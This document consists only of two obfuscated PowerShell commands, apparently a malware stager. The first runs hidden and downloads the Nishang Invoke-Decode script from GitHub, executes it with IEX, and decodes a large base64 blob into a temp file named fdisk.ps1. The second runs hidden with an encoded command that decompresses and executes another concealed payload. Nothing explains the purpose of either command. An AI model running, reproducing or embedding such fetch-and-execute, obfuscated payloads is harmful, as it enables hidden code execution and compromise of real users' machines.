powershell -NoP -NonI -W Hidden -C "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Utility/Invoke-Decode.ps1');Invoke-Decode  xVbfb+JGEH4OEv/DiCABam2H3htVHnIJuUsbEhSSow9I7bIe8B72rru7hvh6/O+d9Y8LcCht1au6Qni93vnm+2Zmxz4FFoaQqg1qE2Ecg1bKQspsBFYBynUxbzbaQ7keuOl5MRvT7LvWj5eD2VTIUG3MbJIbi8mbH+qFsYOcOMjZuu+fzVoAzUazcQpcpTkYjBfOAZmklQeeQnuU38i14swKJf1RfqmShMnQd96g1SY2A2cwW4TCrPzU9FtHII9p+Rvo/0BK/4vrZkMsuq/ievj7ceY9+MPZn5yCzbQERdwjhNunCyBbWAiNGxbHtOEON94NGY+1SlHbHLyS8Pufb0eDYHJ//Ti9eBgGI8G1Mmphg4p1cJlpjdJ+oGgQsWCsYsEFmqCU1wLvjiUIQ8nmMTq/Xu3hMU8Rrqb3D1fgfWBxhnD2fFYN8K6V5ki8JFoTUfWsa66UAQt0TbVaiBgNGMsskrJFJbSoNMeG/MsC42b4C3SdwPv5R+QWSmr+HVp/inMeC+Lf86/URsaKhROrhVx2O5G1qRkEgWYbfylslM0zg5orSbDW5yoJDEs0s8xEahVIYSIml0HCCFsHT1bEwubBRRh64xcyLiedHlE6WAdvwrVI7b8oEqc8s8rTmfyG6SS0OoVEJdWYHiSwjFadQfit2QAanZ3j4d2psfuTN+BN4b0IQ5TgcWhNLNPWoXE0Bo6JrlzOTHn18ZkiVe6a2DzGCq3V+VIvRRzCjI57rJZCgksZnU1jNkqH9LBtrL6msnGKzlt8MNtUPj8xzlVGiSW7lquZBXQf0dgybrtmPTpRJ+QlCMAtAT5TEg2t0W87jA0ePA8VFamkFlFsdM/+h3p8Ryro4jrICr2RSMSK2U/TK7Ekjc7TUrPwpTxP/mKj2/IOrfeTmsNneECOYo3V3X1mvUL4btBcbKrsaFxTaSCU1bFfBN6FXmYJ6bmlUFGRlNXUJp1kA+dQBIFi0PclrhRXRNkIyViaFgFI8l8jZWzHeXKG04jcd/tFE4RqPOp897bAZ9YyvkJdWJObSv0DSR6hjVQIXnUl0eA9aVFzOgAixcUJpS5NMP9FjudoRKJ0JKQK0spVneT6vk7jLrW3GtnqZWkLl8zyaDcS2zpqbpRpmcToDvwEiUFo4E35fHsY3tejawqoj1Qb+9ndj/r3e7E7gHAjZZol3VeMel/buIO2u+UIau2RGtI+tl/UgpceLqdK0zKm+1jb/dslloo/w4aJYvrNQk9tZgtIbcYBnOz22eEz8sx9HRTv4Bze5q7xudZ7q5aqbMFUSJpxS6e16MvlO/RYT4XqDH/9TUH+m40/AQ==   -IsString -OutputFilePath $env:temp\fdisk.ps1"

powershell -NoP -NonI -W Hidden -E "cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AGkAZQB4ACgAYQAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAKABhACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQBbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAWABWAEIATgBUADgATQB3AEQATAAwAGoAOABSACsAaQBDAHIASAB0AGsARQBaAGMAZAArAE4AagBpAEUAcQBvAFYARgBSAG8ASABIAFoASgBFADYAOABOAFMAKwBJAHEAOQBsAGIANgA3ADAAbAB2AHcATQBsACsAdAB0ACsAegBuADYAdgBkAHAAMQBqAFgATQBNAG0AMwA3AGcAcwBNAGkAMwBZAG0AaABsAEQAVwB3AE8AVQBlAE8AdQBNAGQAUgBOADYAVQBUAHoAaABGAGoAOQBxADIAbgBGAHoAcwAxADYAdQBCAGUAYQBTAHQAVQBrAGwAUABaAGUAOQA0AE8ASABkAG4AZwBtAFEAdwBjAGgANAB2AEQAUQBaAEYATwBpAFQATgBtAGcAWQA4AHEAZQBoAG8AMABMAEYAWABRAFcAZgB0AHAASABaAGsAdABOAGYAcwBNAEsAbwBxAFgAdgBBAEUAcwBxAEcAUAArADgAYwBBADUAVQBoADMAcQA4ADMAMQAxAGQAKwBxAGsAQQBGADQAUQBDAHMAUQB1AHcAdwBhAFAAUwArAFgAaQBHAEwARQBDAFIASQBOADQATAAyAFEAUgBoAFIARgBDAHkAeAAzADMAMgBEAE8AaQAzAEsARAAzAHAAbABaAHYARQBOAEEAQgBuAEoAOQBCAEMAdgBrAE0AeQBZAEQAUgBTAEYAdQB4AFcALwB1AGYAOAA3AEQAUABHAG8AaQBJAFcAdAA4AHgAUgA2AFgARwBLAHYAcwBLADIAbgBEADcAZwBJAEwAYgBoAEkAZQBuAGMALwBwADMAawBXAEwAVQA4AHQAegBCAGkALwBPAFcAbwBoADUAeQBkAEsANQBnAFgAagBaADUAagArAE8AaAA2AE4AMQBkAEYAcQBNAEYAVAA4AD0AJwApACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQAsAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApAA=="

